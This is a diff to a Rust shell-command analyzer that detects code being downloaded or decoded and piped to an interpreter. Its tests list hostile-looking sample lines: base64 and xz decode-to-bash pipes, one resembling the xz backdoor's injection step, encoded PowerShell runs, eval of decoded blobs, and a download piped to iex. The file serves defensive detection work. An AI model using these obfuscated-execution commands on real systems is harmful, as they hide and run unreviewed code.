@@ -3,6 +3,9 @@
 
 //! What a shell command line runs, read from its syntax and never executed.
 
+use std::sync::OnceLock;
+
+use regex::Regex;
 use tree_sitter::{Node, Parser};
 
 /// How deep `bash -c` lines inside a line are read.
@@ -407,25 +410,58 @@ fn push(script: &str, found: &mut Vec<String>) {
 /// PowerShell's names.
 const POWERSHELLS: &[&str] = &["pwsh", "powershell", "powershell.exe"];
 
+/// Code a hook runs that it does not hold as text, by how it arrives.
+struct Unseen {
+    /// Whether a command writes such code to standard output.
+    writes: fn(&[Option<String>]) -> bool,
+    /// Whether PowerShell, given these arguments, runs such code.
+    powershell: fn(&[Option<String>]) -> bool,
+    /// Whether a line of code an interpreter is handed runs such code.
+    code: fn(&str) -> bool,
+}
+
+const DOWNLOADED: Unseen = Unseen {
+    writes: downloads,
+    powershell: powershell_runs_a_download,
+    code: |_| false,
+};
+
+const DECODED: Unseen = Unseen {
+    writes: decodes,
+    powershell: powershell_runs_decoded,
+    code: runs_decoded_code,
+};
+
 /// Where `text` hands what it downloads straight to an interpreter: the byte
 /// offset of each command that does it, in order.
 #[must_use]
 pub fn downloads_run(text: &str) -> Vec<usize> {
+    sites(text, &DOWNLOADED)
+}
+
+/// Where `text` decodes code and hands it straight to an interpreter: the
+/// byte offset of each command that decodes it, in order.
+#[must_use]
+pub fn decodes_run(text: &str) -> Vec<usize> {
+    sites(text, &DECODED)
+}
+
+fn sites(text: &str, unseen: &Unseen) -> Vec<usize> {
     let mut found = Vec::new();
-    run_downloads(text, DEPTH, &mut found);
+    run_in(text, DEPTH, unseen, &mut found);
     found.sort_unstable();
     found
 }
 
-fn run_downloads(text: &str, depth: usize, found: &mut Vec<usize>) {
+fn run_in(text: &str, depth: usize, unseen: &Unseen, found: &mut Vec<usize>) {
     let Some(tree) = parser().parse(text, None) else {
         return;
     };
     let mut stack = vec![tree.root_node()];
     while let Some(node) = stack.pop() {
         let at = match node.kind() {
-            "pipeline" => piped(node, text),
-            "command" => handed_over(node, text, depth),
+            "pipeline" => piped(node, text, unseen),
+            "command" => handed_over(node, text, depth, unseen),
             _ => None,
         };
         if let Some(at) = at.filter(|at| !found.contains(at)) {
@@ -437,15 +473,15 @@ fn run_downloads(text: &str, depth: usize, found: &mut Vec<usize>) {
     }
 }
 
-/// A download piped into something that runs what it reads: where it is.
-fn piped(pipeline: Node, text: &str) -> Option<usize> {
+/// Such code piped into something that runs what it reads: where it is.
+fn piped(pipeline: Node, text: &str, unseen: &Unseen) -> Option<usize> {
     let mut cursor = pipeline.walk();
     let stages: Vec<(Node, Node)> = pipeline
         .named_children(&mut cursor)
         .filter_map(|stage| Some((stage, command_of(stage)?)))
         .collect();
     let first = stages.iter().position(|(stage, command)| {
-        !redirected(*stage, text, '>') && downloads(&words(*command, text))
+        !redirected(*stage, text, '>') && (unseen.writes)(&words(*command, text))
     })?;
     // An input redirection after a stage wraps the pipeline so far, so it only
     // ever feeds the last stage.
@@ -592,9 +628,9 @@ fn powershell_reads_input(rest: &[Option<String>]) -> bool {
         && rest.get(at + 1).and_then(|w| w.as_deref()) == Some("-")
 }
 
-/// A download handed to an interpreter inside one command: as a file through
+/// Such code handed to an interpreter inside one command: as a file through
 /// `<(...)`, as code through `$(...)`, or in a line handed to `-c`.
-fn handed_over(command: Node, text: &str, depth: usize) -> Option<usize> {
+fn handed_over(command: Node, text: &str, depth: usize, unseen: &Unseen) -> Option<usize> {
     let words = words(command, text);
     let (program, rest) = program_of(&words)?;
     let mut cursor = command.walk();
@@ -614,24 +650,17 @@ fn handed_over(command: Node, text: &str, depth: usize) -> Option<usize> {
         && let Some(at) = arguments[first..]
             .iter()
             .filter(|a| a.kind() == "process_substitution")
-            .find_map(|a| download_within(*a, text))
+            .find_map(|a| within(*a, text, unseen))
     {
         return Some(at);
     }
     if program == "eval" {
         return arguments[first..]
             .iter()
-            .find_map(|a| download_within(*a, text));
+            .find_map(|a| within(*a, text, unseen));
     }
     if POWERSHELLS.contains(&program) {
-        let line = rest.iter().position(|w| {
-            w.as_deref()
-                .is_some_and(|w| ["-Command", "-c"].iter().any(|f| w.eq_ignore_ascii_case(f)))
-        })?;
-        let code = rest.get(line + 1)?.as_deref()?;
-        return powershell_downloads_run()
-            .is_match(&unquoted(code))
-            .then(|| command.start_byte());
+        return (unseen.powershell)(rest).then(|| command.start_byte());
     }
 
     let code_flag = |w: &str| {
@@ -648,24 +677,25 @@ fn handed_over(command: Node, text: &str, depth: usize) -> Option<usize> {
         .iter()
         .position(|w| w.as_deref().is_some_and(code_flag))?;
     let code = argument(at + 1)?;
-    if let Some(inner) = download_within(code, text) {
+    if let Some(inner) = within(code, text, unseen) {
         return Some(inner);
     }
-    // A shell's `-c` line is read as a line of its own.
     let line = literal(code, text)?;
+    if !shell {
+        return (unseen.code)(&line).then(|| command.start_byte());
+    }
+    // A shell's `-c` line is read as a line of its own.
     let deeper = depth.checked_sub(1)?;
     let mut inner = Vec::new();
-    if shell {
-        run_downloads(&line, deeper, &mut inner);
-    }
+    run_in(&line, deeper, unseen, &mut inner);
     (!inner.is_empty()).then(|| command.start_byte())
 }
 
-/// The first command under `node` that downloads to standard output.
-fn download_within(node: Node, text: &str) -> Option<usize> {
+/// The first command under `node` that writes such code to standard output.
+fn within(node: Node, text: &str, unseen: &Unseen) -> Option<usize> {
     let mut stack = vec![node];
     while let Some(node) = stack.pop() {
-        if node.kind() == "command" && downloads(&words(node, text)) {
+        if node.kind() == "command" && (unseen.writes)(&words(node, text)) {
             return Some(node.start_byte());
         }
         let mut cursor = node.walk();
@@ -676,10 +706,12 @@ fn download_within(node: Node, text: &str) -> Option<usize> {
 }
 
 /// `code` with the text inside its quotes taken out, so a string that only
-/// names a command is not read as one.
+/// names a command is not read as one. An encoding's name is kept, being an
+/// argument the code decodes with.
 fn unquoted(code: &str) -> String {
     let mut out = String::with_capacity(code.len());
     let mut quote = None;
+    let mut inside = String::new();
     for c in code.chars() {
         match quote {
             None => {
@@ -689,13 +721,130 @@ fn unquoted(code: &str) -> String {
                 out.push(c);
             }
             Some(q) if c == q => {
+                if inside == "base64" {
+                    out.push_str(&inside);
+                }
+                inside.clear();
                 quote = None;
                 out.push(c);
             }
-            Some(_) => {}
+            Some(_) => inside.push(c),
         }
     }
     out
+}
+
+/// Decompressor options that take a value.
+const DECOMPRESSOR_VALUED: &[&str] = &[
+    "-F",
+    "--format",
+    "-T",
+    "--threads",
+    "-S",
+    "--suffix",
+    "-M",
+    "--memlimit",
+    "-D",
+];
+
+/// How many operands `args` holds, past each flag and each value a flag in
+/// `valued` takes.
+fn operand_count(args: &[&str], valued: &[&str]) -> usize {
+    let mut count = 0;
+    let mut words = args.iter();
+    while let Some(word) = words.next() {
+        if valued.contains(word) {
+            words.next();
+        } else if !word.starts_with('-') {
+            count += 1;
+        }
+    }
+    count
+}
+
+/// Whether a command writes what it decodes to standard output.
+fn decodes(words: &[Option<String>]) -> bool {
+    let Some((program, rest)) = program_of(words) else {
+        return false;
+    };
+    let args: Vec<&str> = rest.iter().filter_map(|w| w.as_deref()).collect();
+    let short = |letter: char| {
+        args.iter()
+            .any(|a| a.starts_with('-') && !a.starts_with("--") && a.contains(letter))
+    };
+    let has = |flag: &str| args.contains(&flag);
+    match program {
+        "base64" | "base32" => has("--decode") || short('d') || short('D'),
+        "openssl" => has("-d") && !has("-out"),
+        "xxd" => {
+            args.iter().any(|a| a.starts_with("-r"))
+                && operand_count(&args, &["-c", "-g", "-l", "-o", "-s", "-n"]) <= 1
+        }
+        "zcat" | "gzcat" | "xzcat" | "lzcat" | "bzcat" | "zstdcat" => true,
+        "gunzip" | "unxz" | "unlzma" | "bunzip2" | "unzstd" => to_stdout(&args),
+        "gzip" | "xz" | "lzma" | "bzip2" | "zstd" | "brotli" => {
+            (has("--decompress") || short('d')) && to_stdout(&args)
+        }
+        _ => false,
+    }
+}
+
+/// Whether a decompressor writes to standard output: told `-c`, or given no file.
+fn to_stdout(args: &[&str]) -> bool {
+    args.iter().any(|a| {
+        *a == "--stdout" || (a.starts_with('-') && !a.starts_with("--") && a.contains('c'))
+    }) || operand_count(args, DECOMPRESSOR_VALUED) == 0
+}
+
+/// PowerShell's `-EncodedCommand`, under any name it answers to.
+fn encoded_command(word: &str) -> bool {
+    let Some(name) = word.strip_prefix('-') else {
+        return false;
+    };
+    let name = name.to_ascii_lowercase();
+    matches!(name.as_str(), "e" | "ec") || (name.len() >= 3 && "encodedcommand".starts_with(&name))
+}
+
+/// PowerShell's own options, before the script it runs, whose arguments the
+/// rest are.
+fn powershell_options(rest: &[Option<String>]) -> &[Option<String>] {
+    let valued = |w: &str| POWERSHELL_VALUED.iter().any(|n| w.eq_ignore_ascii_case(n));
+    let mut at = 0;
+    while let Some(Some(word)) = rest.get(at) {
+        if !word.starts_with('-') {
+            break;
+        }
+        at += if valued(word) { 2 } else { 1 };
+    }
+    &rest[..at.min(rest.len())]
+}
+
+/// The command PowerShell is handed with `-Command`: every word after it.
+fn powershell_line(rest: &[Option<String>]) -> Option<String> {
+    let at = powershell_options(rest).iter().position(|w| {
+        w.as_deref()
+            .is_some_and(|w| ["-Command", "-c"].iter().any(|f| w.eq_ignore_ascii_case(f)))
+    })?;
+    let words: Vec<&str> = rest[at + 1..].iter().filter_map(|w| w.as_deref()).collect();
+    (!words.is_empty()).then(|| words.join(" "))
+}
+
+fn powershell_runs_a_download(rest: &[Option<String>]) -> bool {
+    powershell_line(rest).is_some_and(|line| powershell_downloads_run().is_match(&unquoted(&line)))
+}
+
+fn powershell_runs_decoded(rest: &[Option<String>]) -> bool {
+    powershell_options(rest)
+        .iter()
+        .any(|w| w.as_deref().is_some_and(encoded_command))
+        || powershell_line(rest)
+            .is_some_and(|line| powershell_decoded_run().is_match(&unquoted(&line)))
+}
+
+/// Whether a line of code both decodes something and runs code or a command.
+fn runs_decoded_code(line: &str) -> bool {
+    let code = unquoted(line);
+    code_that_runs().is_match(&code) && code_that_decodes().is_match(&code)
 }
 
 /// A file a script downloads, and the directories it unpacked it into.
@@ -1210,16 +1359,45 @@ fn moving(package: &str) -> bool {
 }
 
 /// PowerShell handing a download to `Invoke-Expression`, either way round.
-// A fixed pattern, compiled once; a test proves it compiles.
+fn powershell_downloads_run() -> &'static Regex {
+    static PATTERN: OnceLock<Regex> = OnceLock::new();
+    compiled(
+        &PATTERN,
+        r"(?i)\b(?:irm|iwr|invoke-restmethod|invoke-webrequest|curl|wget)\b[^|;]*\|\s*(?:iex|invoke-expression)\b|\b(?:iex|invoke-expression)\b[\s(]*(?:irm|iwr|invoke-restmethod|invoke-webrequest|new-object\s+(?:system\.)?net\.webclient)\b",
+    )
+}
+
+/// PowerShell handing what it decodes from base64 to `iex` or a script block.
+fn powershell_decoded_run() -> &'static Regex {
+    static PATTERN: OnceLock<Regex> = OnceLock::new();
+    compiled(
+        &PATTERN,
+        r"(?i)(?:\b(?:iex|invoke-expression)\b|\[scriptblock\]::create\b).*\bfrombase64string\b|\bfrombase64string\b.*\b(?:iex|invoke-expression)\b",
+    )
+}
+
+/// Code running code or a command, in Python, JavaScript, Ruby, Perl or PHP.
+fn code_that_runs() -> &'static Regex {
+    static PATTERN: OnceLock<Regex> = OnceLock::new();
+    compiled(
+        &PATTERN,
+        r"\b(?:exec|execSync|eval|Function|system|popen|runInThisContext|runInNewContext|instance_eval)\b",
+    )
+}
+
+/// Code decoding base64, hex or a compressed blob, in the same languages.
+fn code_that_decodes() -> &'static Regex {
+    static PATTERN: OnceLock<Regex> = OnceLock::new();
+    compiled(
+        &PATTERN,
+        r#"\b(?:b64decode|b32decode|b16decode|b85decode|a85decode|decodebytes|decodestring|unhexlify|fromhex|decompress|atob|decode64|decode_base64|base64_decode|gzinflate|gzuncompress|inflateSync|gunzipSync)\b|['"]base64['"]"#,
+    )
+}
+
+// A fixed pattern, compiled once; a test proves each compiles.
 #[allow(clippy::expect_used)]
-fn powershell_downloads_run() -> &'static regex::Regex {
-    static PATTERN: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
-    PATTERN.get_or_init(|| {
-        regex::Regex::new(
-            r"(?i)\b(?:irm|iwr|invoke-restmethod|invoke-webrequest|curl|wget)\b[^|;]*\|\s*(?:iex|invoke-expression)\b|\b(?:iex|invoke-expression)\b[\s(]*(?:irm|iwr|invoke-restmethod|invoke-webrequest|new-object\s+(?:system\.)?net\.webclient)\b",
-        )
-        .expect("the pattern compiles")
-    })
+fn compiled(cell: &'static OnceLock<Regex>, pattern: &str) -> &'static Regex {
+    cell.get_or_init(|| Regex::new(pattern).expect("the pattern compiles"))
 }
 
 #[cfg(test)]
@@ -1558,8 +1736,117 @@ mod tests {
     }
 
     #[test]
-    fn the_powershell_pattern_compiles() {
+    fn the_patterns_compile() {
         assert!(powershell_downloads_run().is_match("irm x | iex"));
+        assert!(powershell_decoded_run().is_match("[Convert]::FromBase64String($x) | iex"));
+        assert!(code_that_runs().is_match("eval(x)"));
+        assert!(code_that_decodes().is_match("atob(x)"));
+    }
+
+    fn decoded(line: &str) -> bool {
+        !decodes_run(line).is_empty()
+    }
+
+    #[test]
+    fn a_decoded_payload_piped_into_an_interpreter_is_flagged() {
+        for line in [
+            "sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr \"\t \\-_\" \" \t_\\-\" | xz -d | /bin/bash",
+            "(xz -dc $srcdir/tests/files/good-large_compressed.lzma | tail -c +31265) | xz -F raw --lzma1 -dc | /bin/sh",
+            "echo ZWNobyBoaQo= | base64 -d | sh",
+            "base64 --decode <<< ZWNobyBoaQo= | bash",
+            r#"printf %s "$P" | base64 -D | sudo bash"#,
+            "xxd -r -p payload.hex | bash",
+            "base32 -d <<< MVRWQ3ZANBUQU=== | sh",
+            "gunzip -c payload.gz | sh",
+            "gzip --decompress --stdout payload.gz | bash",
+            "zcat payload.gz | python3 -",
+            "openssl enc -d -aes-256-cbc -pbkdf2 -in p.enc -pass env:K | bash",
+            "echo ZWNobyBoaQo= | base64 -d | node",
+            "xz -d -F raw | sh",
+        ] {
+            assert!(decoded(line), "{line}");
+        }
+    }
+
+    #[test]
+    fn a_decoded_payload_handed_over_as_a_file_or_as_code_is_flagged() {
+        for line in [
+            r#"eval "$(echo ZWNobyBoaQo= | base64 --decode)""#,
+            "bash <(echo ZWNobyBoaQo= | base64 -d)",
+            "source <(base64 -d <<< ZWNobyBoaQo=)",
+            r#"sh -c "$(printf '%s' ZWNobyBoaQo= | openssl base64 -d)""#,
+            "bash -c 'echo ZWNobyBoaQo= | base64 -d | sh'",
+            r#"python3 -c "exec(__import__('base64').b64decode('cHJpbnQoMSk='))""#,
+            r#"node -e "eval(Buffer.from('MQ==', 'base64').toString())""#,
+            r#"php -r 'eval(base64_decode("ZWNobyAxOw=="));'"#,
+            "powershell -NoProfile -enc SQBFAFgA",
+            "pwsh -EncodedCommand SQBFAFgA",
+            "pwsh -e SQBFAFgA",
+            "powershell -ExecutionPolicy Bypass -enc SQBFAFgA",
+            r#"powershell -c "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SQBFAFgA')))""#,
+            r"pwsh -Command iex '([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x)))'",
+            r#"pwsh -Command "$x=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); iex $x""#,
+        ] {
+            assert!(decoded(line), "{line}");
+        }
+    }
+
+    #[test]
+    fn a_decoded_payload_that_nothing_runs_is_not() {
+        for line in [
+            "openssl enc -d -in payload -out decoded.sh | sh",
+            "xxd -r payload.hex decoded.sh | sh",
+            "pwsh -File hook.ps1 -EncodedCommand",
+            r#"pwsh -Command "Write-Output 'iex FromBase64String here'""#,
+            r#"python3 -c "print('run eval(b64decode(x)) to decode')""#,
+            "base64 -d payload > /tmp/x | sh",
+            r#"[[ -n "$encoded" ]] && printf '%s' "$encoded" | base64 -d 2>/dev/null"#,
+            r#"t=$(printf '%s' "$b64" | base64 -d 2>/dev/null || printf '%s' "$b64" | base64 -D 2>/dev/null) || continue"#,
+            r#"echo "$DATA" | base64 -d | jq ."#,
+            r#"zcat backup.sql.gz | psql "$DB""#,
+            "gunzip -c a.tar.gz | tar -x -C /tmp",
+            r#"eval "$(ssh-agent -s)""#,
+            r#"eval "re=\${$c}""#,
+            r#"python3 -c "import base64,sys; print(base64.b64decode(sys.argv[1]).decode())" "$X""#,
+            r#"python3 -c "exec(open('x.py').read())""#,
+            r#"python3 -c "import ast,base64; print(ast.literal_eval(base64.b64decode(s)))""#,
+            r#"node -e "console.log(Buffer.from(process.argv[1], 'base64').toString())""#,
+            r#"pwsh -Command "[Convert]::FromBase64String($s) | Set-Content -AsByteStream out.bin""#,
+            r#"powershell -c "irm https://example.invalid | iex""#,
+            "pwsh -ExecutionPolicy Bypass -File scripts/x.ps1",
+        ] {
+            assert!(!decoded(line), "{line}");
+        }
+    }
+
+    #[test]
+    fn encoding_is_not_decoding() {
+        for line in [
+            "base64 -w 0 hook.sh | sh",
+            "xz -c hook.sh | sh",
+            "openssl enc -aes-256-cbc -in hook.sh | sh",
+            "xxd -p hook.sh | sh",
+            "gzip -d hook.sh.gz | sh",
+        ] {
+            assert!(!decoded(line), "{line}");
+        }
+    }
+
+    #[test]
+    fn a_decode_that_is_only_mentioned_is_not() {
+        for line in [
+            r#"grep -qE 'base64 -d.*\| *(ba)?sh' <<< "$CMD""#,
+            r#"echo "never pipe base64 -d into sh""#,
+        ] {
+            assert!(!decoded(line), "{line}");
+        }
+    }
+
+    #[test]
+    fn the_place_given_is_the_decode() {
+        let text = "set -e\necho ZWNobyBoaQo= | base64 -d | sh\n";
+
+        assert_eq!(decodes_run(text), [place(text, "base64")]);
     }
 
     #[test]
